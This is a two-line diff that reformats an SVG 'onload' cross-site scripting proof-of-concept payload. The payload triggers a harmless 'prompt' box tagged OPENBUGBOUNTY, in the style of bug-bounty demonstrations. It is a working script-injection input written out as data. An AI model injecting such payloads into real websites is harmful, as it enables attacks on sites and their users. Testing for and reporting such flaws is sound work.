@@ -1,2 +1,2 @@
-<svg/onload=prompt(/OPENBUGBOUNTY/)>
+<svg onload="prompt(/OPENBUGBOUNTY/)">
 </svg>
